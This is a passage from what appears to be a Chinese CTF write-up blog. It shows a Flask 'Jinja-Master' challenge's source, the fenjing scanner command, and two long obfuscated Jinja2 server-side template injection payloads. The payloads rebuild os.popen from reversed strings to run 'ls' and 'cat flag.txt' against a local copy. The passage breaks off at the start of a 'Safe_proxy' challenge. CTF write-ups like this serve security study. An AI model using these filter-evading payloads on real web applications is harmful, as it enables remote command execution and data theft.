class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> flag_file:<br>                        flag = flag_file.read()<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span><br>                <span class="hljs-keyword">except</span> FileNotFoundError:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Flag file not found!&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="hljs-string">&lt;head&gt;</span><br><span class="hljs-string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">    &lt;title&gt;Jinja-Master&lt;/title&gt;</span><br><span class="hljs-string">    &lt;style&gt;</span><br><span class="hljs-string">        @import url(&#x27;https://fonts.googleapis.com/css2?family=VT323&amp;display=swap&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        body &#123;</span><br><span class="hljs-string">            display: flex;</span><br><span class="hljs-string">            justify-content: center;</span><br><span class="hljs-string">            align-items: center;</span><br><span class="hljs-string">            height: 100vh;</span><br><span class="hljs-string">            margin: 0;</span><br><span class="hljs-string">            background-image: url(&#x27;/static/image.jpg&#x27;);</span><br><span class="hljs-string">            background-size: cover;</span><br><span class="hljs-string">            background-position: center;</span><br><span class="hljs-string">            font-family: &#x27;VT323&#x27;, monospace;</span><br><span class="hljs-string">            color: #33FF33;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container &#123;</span><br><span class="hljs-string">            background-color: rgba(0, 0, 0, 0.7);</span><br><span class="hljs-string">            padding: 20px;</span><br><span class="hljs-string">            border-radius: 10px;</span><br><span class="hljs-string">            box-shadow: 0px 0px 15px 5px rgba(0, 255, 0, 0.5);</span><br><span class="hljs-string">            max-width: 400px; </span><br><span class="hljs-string">            width: 100%; </span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container input[type=&quot;text&quot;] &#123;</span><br><span class="hljs-string">            width: 100%;</span><br><span class="hljs-string">            padding: 10px;</span><br><span class="hljs-string">            margin: 10px 0;</span><br><span class="hljs-string">            border: 2px solid #33FF33;</span><br><span class="hljs-string">            border-radius: 5px;</span><br><span class="hljs-string">            background-color: #000;</span><br><span class="hljs-string">            color: #33FF33;</span><br><span class="hljs-string">            font-size: 18px;</span><br><span class="hljs-string">            box-sizing: border-box; </span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container input[type=&quot;submit&quot;] &#123;</span><br><span class="hljs-string">            width: 100%;</span><br><span class="hljs-string">            padding: 10px;</span><br><span class="hljs-string">            background-color: #33FF33;</span><br><span class="hljs-string">            border: none;</span><br><span class="hljs-string">            border-radius: 5px;</span><br><span class="hljs-string">            color: #000;</span><br><span class="hljs-string">            font-size: 18px;</span><br><span class="hljs-string">            cursor: pointer;</span><br><span class="hljs-string">            transition: background-color 0.3s ease;</span><br><span class="hljs-string">            box-sizing: border-box; </span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .form-container input[type=&quot;submit&quot;]:hover &#123;</span><br><span class="hljs-string">            background-color: #00FF00;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        .result, .error &#123;</span><br><span class="hljs-string">            margin-top: 20px;</span><br><span class="hljs-string">            padding: 10px;</span><br><span class="hljs-string">            border: 2px solid #33FF33;</span><br><span class="hljs-string">            border-radius: 5px;</span><br><span class="hljs-string">            background-color: #000;</span><br><span class="hljs-string">            color: #33FF33;</span><br><span class="hljs-string">            font-size: 18px;</span><br><span class="hljs-string">            text-align: center;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &lt;/style&gt;</span><br><span class="hljs-string">&lt;/head&gt;</span><br><span class="hljs-string">&lt;body&gt;</span><br><span class="hljs-string">    &lt;div class=&quot;form-container&quot;&gt;</span><br><span class="hljs-string">        &lt;form method=&quot;post&quot;&gt;</span><br><span class="hljs-string">            Enter template string: &lt;input type=&quot;text&quot; name=&quot;c&quot;&gt;</span><br><span class="hljs-string">            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</span><br><span class="hljs-string">        &lt;/form&gt;</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        </span><br><span class="hljs-string">        &lt;div class=&quot;result&quot;&gt;&#123;&#123; rendered_template &#125;&#125;&#123;&#123; error_message &#125;&#125;&lt;/div&gt;</span><br><span class="hljs-string">        </span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.replace(<span class="hljs-string">&quot;&#123;&#123; error_message &#125;&#125;&quot;</span>, error_message <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#123;&#123; rendered_template &#125;&#125;&quot;</span>, rendered_template <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li>题目无回显，需要修改源码，本地调试</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">.replace(<span class="hljs-string">&quot;&#123;&#123; rendered_template &#125;&#125;&quot;</span>, rendered_template <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&#123;% if error_message %&#125;&quot;</span>, error_message <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;&lt;div class=&#x27;error&#x27;&gt;&quot;</span> + error_message + <span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python -m flask <span class="hljs-built_in">run</span> <span class="hljs-attribute">--host</span>=0.0.0.0 <span class="hljs-attribute">--port</span>=1520<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200027251.png" alt="img"> </p><ul><li>fenjing一把嗦</li></ul><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">python</span> -<span class="hljs-string">m</span> <span class="hljs-string">fenjing</span> <span class="hljs-string">scan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://127.0.0.1:1520&quot;</span> <span class="hljs-built_in">--extra-data</span> <span class="hljs-string">&quot;c=1&quot;</span><br></code></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">c=&#123;%<span class="hljs-built_in">set</span> at=<span class="hljs-built_in">dict</span>(rtta=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> xq=<span class="hljs-built_in">dict</span>(so=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> re=<span class="hljs-built_in">dict</span>(daer=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> yd=<span class="hljs-built_in">dict</span>(a=x,b=x,c=x)|length%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-keyword">in</span>=<span class="hljs-built_in">dict</span>(tini=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> ii=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+<span class="hljs-keyword">in</span>+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> gl=<span class="hljs-built_in">dict</span>(slabolg=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> go=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+gl+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> ge=<span class="hljs-built_in">dict</span>(metiteg=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> gi=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+ge+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> bu=<span class="hljs-built_in">dict</span>(snitliub=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> bl=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+bu+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> im=<span class="hljs-built_in">dict</span>(tropmi=x)|first|reverse%&#125;&#123;%<span class="hljs-built_in">set</span> ip=()|select|string|batch(lla+lla+yd)|first|last*(la+la)+im+()|select|string|batch(lla+lla+yd)|first|last*(la+la)%&#125;&#123;%<span class="hljs-built_in">set</span> yt=<span class="hljs-built_in">dict</span>(aaaaa=x)|first|length%&#125;&#123;%<span class="hljs-built_in">set</span> oa=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> la=oa**oa%&#125;&#123;%<span class="hljs-built_in">set</span> lla=(la~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llla=(lla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllla=(llla~la)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> ob=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lb=ob**ob%&#125;&#123;%<span class="hljs-built_in">set</span> llb=(lb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllb=(llb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llllb=(lllb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> bb=llb-lb-lb-lb-lb-lb%&#125;&#123;%<span class="hljs-built_in">set</span> sbb=lllb-llb-llb-llb-llb-llb%&#125;&#123;%<span class="hljs-built_in">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> ob=&#123;&#125;|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lb=ob**ob%&#125;&#123;%<span class="hljs-built_in">set</span> llb=(lb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> lllb=(llb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> llllb=(lllb~lb)|<span class="hljs-built_in">int</span>%&#125;&#123;%<span class="hljs-built_in">set</span> bb=llb-lb-lb-lb-lb-lb%&#125;&#123;%<span class="hljs-built_in">set</span> sbb=lllb-llb-llb-llb-llb-llb%&#125;&#123;%<span class="hljs-built_in">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb%&#125;&#123;%<span class="hljs-built_in">set</span> pw=yd+la%&#125;&#123;%<span class="hljs-built_in">set</span> iw=&#123;&#125;|escape|<span class="hljs-built_in">list</span>|escape|count%&#125;&#123;%<span class="hljs-built_in">set</span> et=iw+lla%&#125;&#123;%<span class="hljs-built_in">set</span> po=((&#123;&#125;|escape|urlencode|first+<span class="hljs-built_in">dict</span>(c=x)|join)*yt)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)%&#125;&#123;%<span class="hljs-built_in">set</span> ls=((&#123;&#125;|escape|urlencode|first+<span class="hljs-built_in">dict</span>(c=x)|join)*(yd+la))%(sbb+et+lla+pw,llla+pw,iw+bb,et+bb+pw)%&#125;&#123;%<span class="hljs-built_in">print</span> (((((((((((x,)|<span class="hljs-built_in">map</span>(at,ii)|first,)|<span class="hljs-built_in">map</span>(at,go)|first,)|<span class="hljs-built_in">map</span>(at,gi)|first)(bl),)|<span class="hljs-built_in">map</span>(at,gi)|first)(ip))(xq),)|<span class="hljs-built_in">map</span>(at,po)|first)(ls),)|<span class="hljs-built_in">map</span>(at,re)|first)()%&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> flag.txt<br></code></pre></td></tr></table></figure><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">c=</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> at=dict(rtta=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> xq=dict(so=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> re=dict(daer=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> oa=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> la=oa**oa<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lla=(la~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llla=(lla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllla=(llla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> yd=dict(a=x,b=x,c=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> oa=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> la=oa**oa<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lla=(la~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llla=(lla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllla=(llla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> <span class="hljs-keyword">in</span>=dict(tini=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ii=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+<span class="hljs-keyword">in</span>+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> gl=dict(slabolg=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> go=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+gl+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ge=dict(metiteg=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> gi=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+ge+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bu=dict(snitliub=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bl=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+bu+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> im=dict(tropmi=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">reverse</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ip=()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)+im+()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span><span class="hljs-keyword">batch</span>(lla+lla+yd)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">last</span>*(la+la)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> yt=dict(aaaaa=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span><span class="hljs-punctuation">|</span><span class="hljs-keyword">length</span><span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> oa=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> la=oa**oa<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lla=(la~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llla=(lla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllla=(llla~la)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ob=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lb=ob**ob<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llb=(lb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllb=(llb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llllb=(lllb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bb=llb-lb-lb-lb-lb-lb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> sbb=lllb-llb-llb-llb-llb-llb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ob=&#123;&#125;<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lb=ob**ob<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llb=(lb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> lllb=(llb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> llllb=(lllb~lb)<span class="hljs-punctuation">|</span>int<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> bb=llb-lb-lb-lb-lb-lb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> sbb=lllb-llb-llb-llb-llb-llb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> ssbb=llllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> zzeb=llllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb-lllb<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> pw=yd+la<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> iw=&#123;&#125;<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>list<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>count<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> et=iw+lla<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> po=((&#123;&#125;<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>urlencode<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>+dict(c=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)*yt)%(llla+la,llla,llla+la,sbb+et+bb+la+la,sbb+et+lla+bb)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">set</span> cf=((&#123;&#125;<span class="hljs-punctuation">|</span><span class="hljs-keyword">escape</span><span class="hljs-punctuation">|</span>urlencode<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>+dict(c=x)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>)*(lla+la))%(sbb+et+bb,sbb+et+pw,llla+yt,iw+bb,sbb+et+bb+yd,sbb+et+lla+pw,sbb+et+pw,sbb+et+bb+pw,et+bb+yd,llla+yt,llla+bb+yd,llla+yt)<span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span> (((((((((((x,)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,ii)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>,)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,go)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>,)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,gi)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)(bl),)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,gi)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)(ip))(xq),)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,po)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)(cf),)<span class="hljs-punctuation">|</span><span class="hljs-keyword">map</span>(at,re)<span class="hljs-punctuation">|</span><span class="hljs-keyword">first</span>)()<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><ul><li>成功获得本地demo的flag</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200022125.png" alt="image-20241220002258598"></p><h3 id="2024-CCB-Safe-proxy"><a href="#2024-CCB-Safe-proxy" class="headerlink" title="2024-CCB-Safe_proxy"></a>2024-CCB-Safe_proxy</h3><p>访问页面，得到源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 